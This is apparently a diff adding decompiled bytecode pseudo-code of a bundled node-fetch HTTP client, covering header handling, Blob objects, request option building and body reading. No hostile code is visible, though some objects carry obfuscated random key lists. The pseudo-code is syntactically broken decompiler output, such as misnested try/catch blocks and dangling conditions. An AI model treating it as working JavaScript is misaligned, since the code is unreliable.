+							ACCU = TypeError
+							ACCU = TypeError(r32)
+						}
+						r31 = r12["push"]
+						r33 = Array["from"]
+						r33 = r33(r16)
+						ACCU = r31(r33)
+					}
+					ACCU = -1
+					r28 = -1
+					r27 = -1
+				}
+				catch
+				{
+					r28 = ACCU
+					r27 = 0
+				}
+				if (!r26)
+				{
+					r31 = Scope[5371]
+					try
+					{
+						if (!r25["return"] == undefined)
+						{
+							ACCU = r25["return"]()
+						}
+						catch {}
+					}
+				}
+				ACCU = null
+				if (r27 === 0)
+				{
+					ACCU = r28
+				}
+				r25 = GetIterator(r12)
+				r24 = r25["next"]
+				ACCU = false
+				r26 = false
+				try
+				{
+					while (true)
+					{
+						r26 = true
+						r30 = r24()
+						if (r30["done"]) break
+						r26 = false
+						r14 = r30["value"]
+						r33 = r30["value"]["length"]
+						r30 = r30["value"]
+						if (!(r33 === 2))
+						{
+							r32 = "Each header pair must be a name/value tuple"
+							ACCU = TypeError
+							ACCU = TypeError(r32)
+						}
+						r31 = <this>["append"]
+						r33 = r14[0]
+						r34 = r14[1]
+						ACCU = r31(r33, r34)
+					}
+					ACCU = -1
+					r28 = -1
+					r27 = -1
+				}
+				catch
+				{
+					r28 = ACCU
+					r27 = 0
+				}
+				if (!r26)
+				{
+					try
+					{
+						if (!r25["return"] == undefined)
+						{
+							ACCU = r25["return"]()
+						}
+						catch {}
+					}
+				}
+				ACCU = null
+				if (r27 === 0)
+				{
+					ACCU = r28
+				}
+			}
+			else
+			{
+				r28 = 117468
+				r24 = Object["keys"]
+				r26 = r24(r1)
+				r25 = GetIterator(r26)
+				r24 = r25["next"]
+				ACCU = false
+				r26 = false
+				try
+				{
+					while (true)
+					{
+						r26 = true
+						r30 = r24()
+						if (r30["done"]) break
+						r26 = false
+						r11 = r1[r30["value"]]
+						ACCU = <this>["append"](r30["value"], r11)
+						r30 = r30["value"]
+					}
+					ACCU = -1
+					r28 = -1
+					r27 = -1
+				}
+				catch
+				{
+					r28 = ACCU
+					r27 = 0
+				}
+				if (!r26)
+				{
+					try
+					{
+						if (!r25["return"] == undefined)
+						{
+							ACCU = r25["return"]()
+						}
+						catch {}
+					}
+				}
+				ACCU = null
+				if (r27 === 0)
+				{
+					ACCU = r28
+				}
+			}
+		}
+		else
+		{
+			ACCU = TypeError
+			ACCU = TypeError("Provided initializer must be an object")
+		}
+	}
+	return undefined
+}
+function func_applyPrototypeProperties_0x100006b6d(a0)
+{
+	r6 = Object["getOwnPropertyNames"]
+	r10 = 39155
+	r8 = r6(Scope[5355][144]["prototype"])
+	r7 = GetIterator(r8)
+	r6 = r7["next"]
+	ACCU = false
+	r8 = false
+	try
+	{
+		while (true)
+		{
+			r8 = true
+			r12 = r6()
+			if (r12["done"]) break
+			r8 = false
+			r3 = r12["value"]
+			ACCU = r12["value"] in a0
+			r12 = r12["value"]
+			if (ACCU) continue
+			r13 = Object["getOwnPropertyDescriptor"]
+			r15 = Scope[5355][144]["prototype"]
+			r4 = r13(r15, r3)
+			r13 = Object["defineProperty"]
+			r15 = a0
+			r16 = r3
+			r17 = r4
+			ACCU = r13(r15, r16, r17)
+		}
+		ACCU = -1
+		r10 = -1
+		r9 = -1
+	}
+	catch
+	{
+		r10 = ACCU
+		r9 = 0
+	}
+	if (!r8)
+	{
+		try
+		{
+			if (!r7["return"] == undefined)
+			{
+				ACCU = r7["return"]()
+			}
+			catch {}
+		}
+	}
+	ACCU = null
+	if (r9 === 0)
+	{
+		ACCU = r10
+	}
+	return undefined
+}
+function func_getBodyUsedFromState_0x100006b6b()
+{
+	return <this>[Scope[5355][142]]["disturbed"]
+}
+function func_getBodyFromState_0x100006b69()
+{
+	return <this>[Scope[5355][142]]["body"]
+}
+function func_sliceBlob_0x100006b4f()
+{
+	r9 = unmapped(a0)
+	r0 = <this>["size"]
+	r1 = r9[0]
+	r2 = r9[1]
+	r3 = undefined
+	r4 = undefined
+	if (r1 === undefined)
+	{
+		r3 = 0
+	}
+	else
+	{
+		if (r1 < 0)
+		{
+			r10 = Math["max"]
+			r12 = (r0 + r1)
+			r3 = r10(r12, 0)
+		}
+		else
+		{
+			r10 = Math["min"]
+			r3 = r10(r1, r0)
+		}
+	}
+	if (r2 === undefined)
+	{
+		r4 = r0
+		ACCU = r4
+	}
+	else
+	{
+		if (r2 < 0)
+		{
+			r10 = Math["max"]
+			r12 = (r0 + r2)
+			r4 = r10(r12, 0)
+		}
+		else
+		{
+			r10 = Math["min"]
+			r4 = r10(r2, r0)
+		}
+	}
+	r10 = Math["max"]
+	r12 = (r4 - r3)
+	r5 = r10(r12, 0)
+	r10 = <this>[Scope[5355][137]]["slice"]
+	r13 = (r3 + r5)
+	r6 = r10(r3, r13)
+	r11 = []
+	r12 = new {"type": null}
+	r12["type"] = r9[2]
+	ACCU = func_initBlob_0x100006b41
+	r7 = func_initBlob_0x100006b41(r11, r12)
+	r7[Scope[5355][137]] = r6
+	return r7
+}
+function func_toBlobString_0x100006b4d()
+{
+	return "[object Blob]"
+}
+function func_createReadableStream_0x100006b4b()
+{
+	r0 = Scope[5355][136](r0)
+	r0["_read"] = func_noopBlob_0x100006b4a
+	ACCU = r0["push"](<this>[Scope[5355][137]])
+	ACCU = r0["push"](null)
+	return r0
+}
+function func_blobToArrayBuffer_0x100006b48()
+{
+	r3 = <this>[Scope[5355][137]]["buffer"]["slice"]
+	r5 = <this>[Scope[5355][137]]["byteOffset"]
+	r8 = <this>[Scope[5355][137]]["byteOffset"]
+	r9 = <this>[Scope[5355][137]]["byteLength"]
+	r6 = (r8 + r9)
+	r1 = r3(r5, r6)
+	return Promise["resolve"](r1)
+}
+function func_blobToText_0x100006b46()
+{
+	r1 = Promise["resolve"]
+	r3 = <this>[Scope[5355][137]]["toString"]
+	r3 = r3()
+	return r1(r3)
+}
+function func_getBlobType_0x100006b44()
+{
+	return <this>[Scope[5355][138]]
+}
+function func_getBlobSize_0x100006b43()
+{
+	return <this>[Scope[5355][137]]["length"]
+}
+function func_initBlob_0x100006b41()
+{
+	r6 = unmapped(a0)
+	<this>[Scope[5355][138]] = ""
+	r1 = r6[0]
+	r2 = r6[1]
+	r3 = []
+	r4 = 0
+	if (r1)
+	{
+		r7 = r1
+		r15 = r1["length"]
+		r8 = Number(r15)
+		r9 = 0
+		while (true)
+		{
+			if (!r9 < r8) break
+			r10 = r7[r9]
+			r11 = undefined
+			if (r10 instanceof Buffer)
+			{
+				r11 = r10
+				ACCU = r11
+			}
+			else
+			{
+				if (ArrayBuffer["isView"](r10))
+				{
+					r12 = Buffer["from"]
+					r14 = r10["buffer"]
+					r15 = r10["byteOffset"]
+					r16 = r10["byteLength"]
+					r11 = r12(r14, r15, r16)
+				}
+				else
+				{
+					if (r10 instanceof ArrayBuffer)
+					{
+						r12 = Buffer["from"]
+						r11 = r12(r10)
+					}
+					else
+					{
+						if (r10 instanceof func_initBlob_0x100006b41)
+						{
+							r11 = r10[Scope[5355][137]]
+						}
+						else
+						{
+							r12 = Buffer["from"]
+							r16 = TypeOf(r10)
+							r17 = "string"
+							ACCU = r16 == r17
+							if (r16 == r17)
+							{
+								ACCU = r10
+							}
+							else
+							{
+								ACCU = String(r10)
+							}
+							r14 = ACCU
+							r11 = r12(r14)
+						}
+					}
+				}
+			}
+			r12 = r4
+			r4 = (r4 + r11["length"])
+			ACCU = r3["push"](r11)
+			r9 = (r9 + 1)
+		}
+	}
+	<this>[Scope[5355][137]] = Buffer["concat"](r3)
+	ACCU = r2
+	if (r2)
+	{
+		r14 = r2["type"]
+		r15 = undefined
+		ACCU = !(r14 === r15)
+		if (!(r14 === r15))
+		{
+			r13 = String(r2["type"])
+			r12 = r13["toLowerCase"]
+			ACCU = r12()
+		}
+	}
+	r5 = ACCU
+	if (ACCU)
+	{
+		r13 = \[^\\\\u0020-\\\\u007E]\
+		r12 = r13["test"]
+		if (!Boolean(r12(r5)))
+		{
+			<this>[Scope[5355][138]] = r5
+			ACCU = r5
+		}
+	}
+	return undefined
+}
+function func_initFetchRequest_0x100006ac2(a0, a1)
+{
+	Scope[5388][3] = a0
+	Scope[5388][2] = a1
+	Scope[5388][44] = func_Hn_0x100006a61
+	r1 = new {"pNgqa": null, "CGsJM": null, "CenGq": null, "yDxkC": null, "vWIiy": null, "OVsNR": null, "xeffE": null, "eVCfe": null, "ZZCnq": null, "MlEAs": null, "IZXya": null, "ZpqlT": null, "wsNAA": null, "Judzg": null, "oxfSo": null, "TJNdi": null, "mQiMP": null, "QaWRM": null, "wjgtk": null, "pmWPJ": null, "MkVmR": null, "PHliZ": null, "WcXYm": null, "hiEky": null, "kGzmt": null, "xosHX": null, "GGMzu": null, "VIjvt": null, "qRcoj": null, "CnvML": null, "nViFO": null, "vEdTj": null, "MIkGA": null, "NeoLo": null, "Xcwla": null, "XGaDy": null, "HVZXg": null, "sSera": null, "MKzsF": null, "GgXmZ": null, "OOLrl": null, "nmvua": null, "oGjKj": null, "CKqGe": null, "tBKMn": null, "WSIHl": null, "uXlny": null, "inrZx": null, "Ppbwg": null, "SBdyq": null, "KYdSb": null, "znwQf": null, "YOfyO": null, "MMmru": null, "xrTkX": null, "RhwgU": null, "IUUmT": null, "HUCTw": null, "ISCnI": null, "tJfwa": null, "yKujI": null, "ZPRaX": null, "Jlesp": null, "tVnVo": null}
+	Scope[5388][45] = r1
+	if (!Scope[5355][184]["Promise"])
+	{
+		r2 = "native promise missing, set fetch.Promise to your favorite alternative"
+		ACCU = Error
+		ACCU = Error(r2)
+	}
+	Scope[5355][144]["Promise"] = Scope[5355][184]["Promise"]
+	r1 = Scope[5355][184]["Promise"]
+	ACCU = r1
+	return r1(func_executeHttpRequest_0x100006ac1)
+}
+function func_initAbortError_0x100006a5f(a0)
+{
+	r1 = Error["call"]
+	ACCU = r1(<this>, a0)
+	<this>["type"] = "aborted"
+	<this>["message"] = a0
+	ACCU = Error["captureStackTrace"](<this>, <this>["constructor"])
+	return undefined
+}
+function func_buildFetchOptions_0x100006a5d(a0)
+{
+	r7 = a0[Scope[5355][169]]
+	r1 = r7["parsedURL"]
+	r8 = a0[Scope[5355][169]]
+	r8 = r8["headers"]
+	ACCU = func_initHeaders_0x100006b6f
+	r2 = func_initHeaders_0x100006b6f(r8)
+	r7 = r2["has"]
+	r9 = "Accept"
+	if (!r7(r9))
+	{
+		r7 = r2["set"]
+		r9 = "Accept"
+		ACCU = r7(r9, "*/*")
+	}
+	if (!r1["protocol"])
+		|| (!r1["hostname"])
+	{
+		r8 = "Only absolute URLs are supported"
+		ACCU = TypeError
+		ACCU = TypeError(r8)
+	}
+	r8 = \^https?:$\
+	r7 = r8["test"]
+	r9 = r1["protocol"]
+	if (!r7(r9))
+	{
+		r8 = "Only HTTP(S) protocols are supported"
+		ACCU = TypeError
+		ACCU = TypeError(r8)
+	}
+	if (a0["signal"])
+	{
+		r9 = a0["body"]
+		if (r9 instanceof Scope[5355][132]["Readable"])
+		{
+			if (!Scope[5355][174])
+			{
+				r8 = "Cancellation of streamed requests with AbortSignal is not supported in node < 8"
+				ACCU = Error
+				ACCU = Error(r8)
+			}
+		}
+	}
+	r3 = null
+	r9 = a0["body"]
+	if (r9 == null)
+	{
+		r8 = \^(POST|PUT)$\
+		r7 = r8["test"]
+		r9 = a0["method"]
+		if (r7(r9))
+		{
+		}
+	}
+	r9 = a0["body"]
+	if (!(r9 == null))
+	{
+		r5 = func_getBodyLength_0x100006a3f(a0)
+		r9 = TypeOf(r5)
+		if (r9 == "number")
+		{
+			r3 = String(r5)
+		}
+	}
+	if (r3)
+	{
+		r7 = r2["set"]
+		r9 = "Content-Length"
+		ACCU = r7(r9, r3)
+	}
+	r7 = r2["has"]
+	r9 = "User-Agent"
+	if (!r7(r9))
+	{
+		r7 = r2["set"]
+		r10 = "node-fetch/1.0 (+https://github.com/bitinn/node-fetch)"
+		ACCU = r7("User-Agent", r10)
+	}
+	if (a0["compress"])
+	{
+		r7 = r2["has"]
+		r9 = "Accept-Encoding"
+		if (!Boolean(r7(r9)))
+		{
+			r7 = r2["set"]
+			r9 = "Accept-Encoding"
+			r10 = "gzip,deflate"
+			ACCU = r7(r9, r10)
+		}
+	}
+	r4 = a0["agent"]
+	r9 = TypeOf(r4)
+	r10 = "function"
+	if (r9 == r10)
+	{
+		r4 = r4(r1)
+	}
+	r7 = r2["has"]
+	r9 = "Connection"
+	if (!Boolean(r7(r9)))
+	{
+		if (!Boolean(r4))
+		{
+			r7 = r2["set"]
+			r9 = "Connection"
+			r10 = "close"
+			ACCU = r7(r9, r10)
+		}
+	}
+	r7 = Object["assign"]
+	r9 = {}
+	r11 = new {"method": null, "headers": null, "agent": null}
+	r11["method"] = a0["method"]
+	r11["headers"] = func_normalizeHeaders_0x100006a53(r2)
+	r11["agent"] = r4
+	return r7(r9, r1, r11)
+}
+function func_isAbortSignal_0x100006a5b(a0)
+{
+	ACCU = a0
+	if (a0)
+	{
+		r5 = TypeOf(a0)
+		r6 = "object"
+		ACCU = r5 == r6
+		if (r5 == r6)
+		{
+			r3 = Object["getPrototypeOf"]
+			ACCU = r3(a0)
+		}
+	}
+	r1 = ACCU
+	if (ACCU)
+	{
+		r5 = r1["constructor"]["name"]
+		ACCU = r5 === "AbortSignal"
+	}
+	return !(!Boolean(ACCU))
+}
+function func_isAsyncIterable_0x100006a59(a0)
+{
+	r3 = TypeOf(a0)
+	r4 = "object"
+	ACCU = r3 == r4
+	if (r3 == r4)
+	{
+		r3 = TypeOf(a0[Scope[5355][169]])
+		ACCU = r3 == "object"
+	}
+	return ACCU
+}
+function func_normalizeUrlScheme_0x100006a57(a0)
+{
+	r3 = \^[a-zA-Z][a-zA-Z\\\\d+\\\\-.]*:\
+	r2 = r3["exec"]
+	if (r2(a0))
+	{
+		ACCU = Scope[5355][170]
+		r3 = Scope[5355][170](func_Pu_0x100006a56)
+		r2 = r3["toString"]
+		a0 = r2()
+	}
+	return Scope[5355][171](a0)
+}
+function func_buildHeadersMap_0x100006a55(a0)
+{
+	r1 = func_initHeaders_0x100006b6f(func_Iu_0x100006a54)
+	r12 = 115386
+	r8 = Object["keys"]
+	r10 = r8(a0)
+	r9 = GetIterator(r10)
+	r8 = r9["next"]
+	ACCU = false
+	r10 = false
+	try
+	{
+		while (true)
+		{
+			r10 = true
+			r14 = r8()
+			if (r14["done"]) break
+			r10 = false
+			r5 = r14["value"]
+			r15 = Scope[5355][153]["test"]
+			ACCU = r15(r14["value"])
+			r14 = r14["value"]
+			if (ACCU) continue
+			r16 = Array
+			r19 = 93401
+			r15 = Array["isArray"]
+			r17 = a0[r5]
+			if (r15(r17))
+			{
+				r17 = a0[r5]
+				r16 = GetIterator(r17)
+				r15 = r16["next"]
+				ACCU = false
+				r17 = false
+				try
+				{
+					while (true)
+					{
+						r17 = true
+						r21 = r15()
+						if (r21["done"]) break
+						r17 = false
+						r7 = r21["value"]
+						r22 = Scope[5355][154]["test"]
+						ACCU = r22(r21["value"])
+						r21 = r21["value"]
+						if (ACCU) continue
+						r24 = r1[Scope[5355][158]]
+						r24 = r24[r5]
+						r25 = undefined
+						if (r24 === r25)
+						{
+							r22 = r1[Scope[5355][158]]
+							r25 = new [0]
+							r25[0] = r7
+							r22[r5] = r25
+							ACCU = r25
+							continue
+						}
+						r23 = r1[Scope[5355][158]]
+						r23 = r23[r5]
+						ACCU = r23["push"](r7)
+					}
+					ACCU = -1
+					r19 = -1
+					r18 = -1
+				}
+				catch
+				{
+					r19 = ACCU
+					r18 = 0
+				}
+				if (!r17)
+				{
+					try
+					{
+						if (!r16["return"] == undefined)
+						{
+							ACCU = r16["return"]()
+						}
+						catch {}
+					}
+				}
+				ACCU = null
+				if (r18 === 0)
+				{
+					r11 = 0
+					r12 = r19
+					break
+				}
+				continue
+			}
+			r15 = Scope[5355][154]["test"]
+			r17 = a0[r5]
+			if (r15(r17)) continue
+			r15 = r1[Scope[5355][158]]
+			r18 = new [0]
+			r18[0] = a0[r5]
+			r15[r5] = r18
+			ACCU = r18
+		}
+		ACCU = -1
+		r12 = -1
+		r11 = -1
+	}
+	catch
+	{
+		r12 = ACCU
+		r11 = 0
+	}
+	if (!r10)
+	{
+		try
+		{
+			if (!r9["return"] == undefined)
+			{
+				ACCU = r9["return"]()
+			}
+			catch {}
+		}
+	}
+	ACCU = null
+	if (r11 === 0)
+	{
+		ACCU = r12
+	}
+	return r1
+}
+function func_normalizeHeaders_0x100006a53(a0)
+{
+	r3 = Object["assign"]
+	r5 = new {}
+	r6 = a0[Scope[5355][158]]
+	r1 = r3(r5, r6)
+	r6 = a0[Scope[5355][158]]
+	r2 = func_getHeaderValue_0x100006a47(r6, "Host")
+	if (!(r2 === undefined))
+	{
+		r5 = r1[r2]
+		ACCU = r5[0]
+		r5 = r5[0]
+		r1[r2] = ACCU
+		ACCU = r5
+	}
+	return r1
+}
+function func_createIteratorResult_0x100006a51(a0, a1)
+{
+	r3 = Object["create"]
+	r0 = r3(Scope[5355][163])
+	r5 = new {"target": null, "kind": null, "index": 0}
+	r5["target"] = a0
+	r5["kind"] = a1
+	r0[Scope[5355][161]] = r5
+	return r0
+}
+function func_normalizeHeaders_0x100006a4f(a0)
+{
+	Scope[5420][2] = a0
+	r1 = unmapped(a0)
+	Scope[5420][6] = func_nr_0x100006a48
+	if (r1["length"] > 1)
+	r5 = r1[1]
+	r6 = undefined
+	ACCU = !(r5 === r6)
+		&& (!(r5 === r6))
+	{
+		ACCU = r1[1]
+	}
+	else
+	{
+		ACCU = "key+value"
+	}
+	r0 = ACCU
+	r5 = Object["keys"]
+	r5 = r5(Scope[5420][2][Scope[5355][158]])
+	r4 = r5["sort"]
+	r4 = r4()
+	r3 = r4["map"]
+	r8 = "key"
+	ACCU = r0 === r8
+	if (r0 === r8)
+	{
+		ACCU = func_toLowerCase_0x100006a4a
+	}
+	else
+	{
+		r8 = "value"
+		ACCU = r0 === r8
+		if (r0 === r8)
+		{
+			ACCU = func_joinHeaderValues_0x100006a4c
+		}
+		else
+		{
+			ACCU = func_normalizeHeader_0x100006a4e
+		}
+	}
+	r5 = ACCU
+	return r3(r5)
+}
+function func_getHeaderValue_0x100006a47(a0, a1)
+{
+	r4 = a1["toLowerCase"]
+	a1 = r4()
+	if (!a0 == undefined)
+	{
+		r4 = Generator(ToObject(a0))
+		r8 = 0
+		while (true)
+		{
+			if (!GeneratorContinue(r8)) break
+			if (r4.next().value == undefined) continue
+			r1 = r4.next().value
+			r3 = r4.next().value
+			r11 = r1["toLowerCase"]
+			r11 = r11()
+			if (!r11 === a1) continue
+			return r3
+			r8 = GeneratorStep(r8)
+		}
+	}
+	return undefined
+}
+function func_validateHttpHeaderValue_0x100006a45(a0)
+{
+	r1 = Scope[5355][154]["test"]
+	if (r1(("" + a0)))
+	{
+		r2 = (("" + a0) + " is not a legal HTTP header value")
+		ACCU = TypeError
+		ACCU = TypeError(r2)
+	}
+	return undefined
+}
+function func_validateHeaderName_0x100006a43(a0)
+{
+	r2 = Scope[5355][153]["test"]
+	if (r2(("" + a0)))
+		|| (func_strictEquals_0x100006ad4(("" + a0), ""))
+	{
+		ACCU = TypeError
+		ACCU = TypeError((("" + a0) + " is not a legal HTTP header name"))
+	}
+	return undefined
+}
+function func_pipeRequestBody_0x100006a41(a0, a1)
+{
+	r0 = a1["body"]
+	if (r0 === null)
+	{
+		r3 = a0["end"]
+		ACCU = r3()
+	}
+	else
+	{
+		if (func_isBlobLike_0x100006a39(r0))
+		{
+			r4 = r0["stream"]
+			r4 = r4()
+			ACCU = r4["pipe"](a0)
+		}
+		else
+		{
+			r3 = Buffer["isBuffer"]
+			if (r3(r0))
+			{
+				ACCU = a0["write"](r0)
+				ACCU = a0["end"]()
+			}
+			else
+			{
+				ACCU = r0["pipe"](a0)
+			}
+		}
+	}
+	return undefined
+}
+function func_getBodyLength_0x100006a3f(a0)
+{
+	r1 = a0["body"]
+	ACCU = r1 === null
+	if (r1 === null)
+	{
+		ACCU = 0
+	}
+	else
+	{
+		ACCU = func_isBlobLike_0x100006a39(r1)
+		if (func_isBlobLike_0x100006a39(r1))
+		{
+			ACCU = r1["size"]
+		}
+		else
+		{
+			r3 = Buffer["isBuffer"]
+			if (r3(r1))
+			{
+				ACCU = r1["length"]
+			}
+			else
+			{
+				if (r1)
+				r5 = TypeOf(r1["getLengthSync"])
+					&& (r5 == "function")
+					&& (r1["_lengthRetrievers"])
+				r5 = r1["_lengthRetrievers"]["length"]
+					&& (r5 == 0)
+					|| (r1["hasKnownLength"])
+				r3 = r1["hasKnownLength"]
+					&& (r3())
+				{
+					ACCU = r1["getLengthSync"]()
+				}
+				else
+				{
+					ACCU = null
+				}
+			}
+		}
+	}
+	return ACCU
+}
+function func_extractContentType_0x100006a3d(a0)
+{
+	ACCU = a0 === null
+	if (a0 === null)
+	{
+		ACCU = null
+	}
+	else
+	{
+		r3 = TypeOf(a0)
+		r4 = "string"
+		ACCU = r3 == r4
+		if (r3 == r4)
+		{
+			ACCU = "text/plain;charset=UTF-8"
+		}
+		else
+		{
+			if (func_isURLSearchParams_0x100006a37(a0))
+			{
+				ACCU = "application/x-www-form-urlencoded;charset=UTF-8"
+			}
+			else
+			{
+				if (func_isBlobLike_0x100006a39(a0))
+				{
+					if (!a0["type"])
+					{
+						ACCU = null
+					}
+				}
+				else
+				{
+					r1 = Buffer["isBuffer"]
+					if (r1(a0))
+					r4 = Object["prototype"]["toString"]
+					r3 = r4["call"]
+					r3 = r3(a0)
+					r4 = "[object ArrayBuffer]"
+						|| (r3 === r4)
+						|| (ArrayBuffer["isView"](a0))
+					{
+						ACCU = null
+					}
+					else
+					{
+						r3 = TypeOf(a0["getBoundary"])
+						if (r3 == "function")
+						{
+							r2 = a0["getBoundary"]
+							ACCU = ("multipart/form-data;boundary=" + r2())
+						}
+						else
+						{
+							if (a0 instanceof Scope[5355][132])
+							{
+								ACCU = null
+							}
+							else
+							{
+								ACCU = "text/plain;charset=UTF-8"
+							}
+						}
+					}
+				}
+			}
+		}
+	}
+	return ACCU
+}
+function func_cloneBody_0x100006a3b(a0)
+{
+	r0 = undefined
+	r1 = undefined
+	r2 = a0["body"]
+	if (a0["bodyUsed"])
+	{
+		r6 = "cannot clone body after it is used"
+		ACCU = Error
+		ACCU = Error(r6)
+	}
+	if (r2 instanceof Scope[5355][132])
+	{
+		r7 = TypeOf(r2["getBoundary"])
+		if (!(r7 == "function"))
+		{
+			r0 = Scope[5355][143](r0)
+			r1 = Scope[5355][143](r0)
+			ACCU = r2["pipe"](r0)
+			ACCU = r2["pipe"](r1)
+			r5 = a0[Scope[5355][142]]
+			r5["body"] = r0
+			r2 = r1
+			ACCU = r1
+		}
+	}
+	return r2
+}
+function func_isBlobLike_0x100006a39(a0)
+{
+	r4 = TypeOf(a0)
+	r5 = "object"
+	ACCU = r4 == r5
+	if (r4 == r5)
+	{
+		r4 = TypeOf(a0["arrayBuffer"])
+		r5 = "function"
+		ACCU = r4 == r5
+		if (r4 == r5)
+		{
+			r4 = TypeOf(a0["type"])
+			r5 = "string"
+			if (r4 == r5)
+			{
+				r4 = TypeOf(a0["stream"])
+				r5 = "function"
+				if (r4 == r5)
+				{
+					r4 = TypeOf(a0["constructor"])
+					r5 = "function"
+					if (r4 == r5)
+					{
+						r4 = TypeOf(a0["constructor"]["name"])
+						if (r4 == "string")
+						{
+							r3 = \^(Blob|File)$\
+							r2 = r3["test"]
+							r4 = a0["constructor"]["name"]
+							if (r2(r4))
+							{
+								r3 = \^(Blob|File)$\
+								ACCU = r3["test"](a0[Symbol["toStringTag"]])
+							}
+						}
+					}
+				}
+			}
+		}
+	}
+	return ACCU
+}
+function func_isURLSearchParams_0x100006a37(a0)
+{
+	r3 = TypeOf(a0)
+	if (!(r3 == "object"))
+	r3 = TypeOf(a0["append"])
+		|| (!(r3 == "function"))
+	r3 = TypeOf(a0["delete"])
+		|| (!(r3 == "function"))
+	r3 = TypeOf(a0["get"])
+		|| (!(r3 == "function"))
+	r3 = TypeOf(a0["getAll"])
+		|| (!(r3 == "function"))
+	r3 = TypeOf(a0["has"])
+		|| (!(r3 == "function"))
+	r3 = TypeOf(a0["set"])
+	r4 = "function"
+	ACCU = !(r3 == r4)
+		|| (!(r3 == r4))
+	{
+		ACCU = false
+	}
+	else
+	{
+		r3 = a0["constructor"]["name"]
+		r4 = "URLSearchParams"
+		ACCU = r3 === r4
+		if (!r3 === r4)
+		{
+			r4 = Object["prototype"]["toString"]
+			r3 = r4["call"]
+			r3 = r3(a0)
+			r4 = "[object URLSearchParams]"
+			if (!r3 === r4)
+			{
+				r3 = TypeOf(a0["sort"])
+				ACCU = r3 == "function"
+			}
+		}
+	}
+	return ACCU
+}
+function func_textConverted_0x100006a35(a0, a1)
+{
+	r8 = TypeOf(Scope[5355][141])
+	r9 = "function"
+	if (!(r8 == r9))
+	{
+		ACCU = Error
+		ACCU = Error("The package `encoding` must be installed to use the textConverted() function")
+	}
+	r6 = a1["get"]
+	r1 = r6("content-type")
+	r2 = "utf-8"
+	r3 = undefined
+	r4 = undefined
+	if (r1)
+	{
+		r7 = \charset=([^;]*)\
+		r6 = r7["exec"]
+		r3 = r6(r1)
+	}
+	r7 = a0["slice"]
+	r7 = r7(0, 1024)
+	r6 = r7["toString"]
+	r4 = r6()
+	r8 = !Boolean(r3)
+	if (func_andDefault_0x100006ae2(r8, r4))
+	{
+		r7 = \<meta.+?charset=(['\"])(.+?)\\\\1\
+		r6 = r7["exec"]
+		r3 = r6(r4)
+	}
+	r8 = !Boolean(r3)
+	if (func_andDefault_0x100006ae2(r8, r4))
+	{
+		r7 = \<meta[\\\\s]+?http-equiv=(['\"])content-type\\\\1[\\\\s]+?content=(['\"])(.+?)\\\\2\
+		r6 = r7["exec"]
+		r3 = r6(r4)
+		if (!r6(r4))
+		{
+			r7 = \<meta[\\\\s]+?content=(['\"])(.+?)\\\\1[\\\\s]+?http-equiv=(['\"])content-type\\\\3\
+			r6 = r7["exec"]
+			r3 = r6(r4)
+			if (r6(r4))
+			{
+				r6 = r3["pop"]
+				ACCU = r6()
+			}
+		}
+		if (r3)
+		{
+			r7 = \charset=(.*)\
+			r6 = r7["exec"]
+			r8 = r3["pop"]
+			r8 = r8()
+			r3 = r6(r8)
+		}
+	}
+	r8 = !Boolean(r3)
+	if (func_andDefault_0x100006ae2(r8, r4))
+	{
+		r7 = \<\\\\?xml.+?encoding=(['\"])(.+?)\\\\1\
+		r6 = r7["exec"]
+		r3 = r6(r4)
+	}
+	if (r3)
+	{
+		r6 = r3["pop"]
+		r2 = r6()
+		r9 = "gb2312"
+		ACCU = r2 === r9
+		if (!r2 === r9)
+		{
+			ACCU = r2 === "gbk"
+		}
+		if (ACCU)
+		{
+			r2 = "gb18030"
+		}
+	}
+	r7 = Scope[5355][141](a0, "UTF-8", r2)
+	r6 = r7["toString"]
+	return r6()
+}
+function func_consumeBody_0x100006a33()
+{
+	Scope[5428][13] = func_U0_0x100006a1c
+	r1 = new {"EVApH": null, "XxXtY": null, "olEfl": null, "oFveH": null, "ZZlxU": null, "JzAEh": null, "wszlD": null}
+	Scope[5428][10] = r1
+	Scope[5428][11] = <this>
+	if (<this>[Scope[5355][142]]["disturbed"])
+	{
+		r2 = Scope[5355][144]["Promise"]
+		r1 = r2["reject"]
+		r4 = ("body used already for: " + <this>["url"])
+		ACCU = TypeError
+		r3 = TypeError(r4)
+		return r1(r3)
+	}
+	r2 = "disturbed"
+	<this>[Scope[5355][142]][r2] = true
+	if (<this>[Scope[5355][142]]["error"])
+	{
+		r1 = Scope[5355][144]["Promise"]["reject"]
+		r3 = <this>[Scope[5355][142]]["error"]
+		return r1(r3)
+	}
+	Scope[5428][12] = <this>["body"]
+	if (Scope[5428][12] === null)
+	{
+		r1 = Scope[5355][144]["Promise"]["resolve"]
+		r3 = Buffer["alloc"]
+		r3 = r3(0)
+		return r1(r3)
+	}
+	if (func_isBlobLike_0x100006a39(Scope[5428][12]))
+	{
+		Scope[5428][12] = Scope[5428][12]["stream"]()
+	}
+	r1 = Buffer["isBuffer"]
+	if (r1(Scope[5428][12]))
+	{
+		r1 = Scope[5355][144]["Promise"]["resolve"]
+		return r1(Scope[5428][12])
+	}
+	if (!Scope[5428][12] instanceof Scope[5355][132])
+	{
+		r1 = Scope[5355][144]["Promise"]["resolve"]
+		r3 = Buffer["alloc"]
+		r3 = r3(0)
+		return r1(r3)
+	}
+	Scope[5428][14] = []
+	Scope[5428][15] = 0
+	Scope[5428][16] = false
+	r1 = Scope[5355][144]["Promise"]
+	ACCU = r1
+	return r1(func_initializeBodyCollector_0x100006a32)
+}
+function func_FetchBody_0x100006a1b(a0)
+{
+	r5 = unmapped(a0)
+	Scope[5436][3] = func_Pu_0x100006a18
+	Scope[5436][4] = <this>
+	if (r5["length"] > 1)
+	r9 = r5[1]
+		&& (!(r9 === undefined))
+	{
+		ACCU = r5[1]
+	}
+	else
+	{
+	}
+	r0 = {}
+	r1 = r0["size"]
+	r10 = undefined
+	ACCU = r1 === r10
+	if (r1 === r10)
+	{
+		ACCU = 0
+	}
+	else
+	{
+		ACCU = r1
+	}
+	r2 = ACCU
+	r3 = r0["timeout"]
+	r10 = undefined
+	ACCU = r3 === r10
+	if (r3 === r10)
+	{
+		ACCU = 0
+	}
+	else
+	{
+		ACCU = r3
+	}
+	r4 = ACCU
+	if (a0 == null)
+	{
+		a0 = null
+	}
+	else
+	{
+		if (func_isURLSearchParams_0x100006a37(a0))
+		{
+			r7 = Buffer["from"]
+			r9 = a0["toString"]
+			r9 = r9()
+			a0 = r7(r9)
+		}
+		else
+		{
+			if (!func_isBlobLike_0x100006a39(a0))
+			{
+				r7 = Buffer["isBuffer"]
+				if (!r7(a0))
+				{
+					r10 = Object["prototype"]["toString"]
+					r9 = r10["call"]
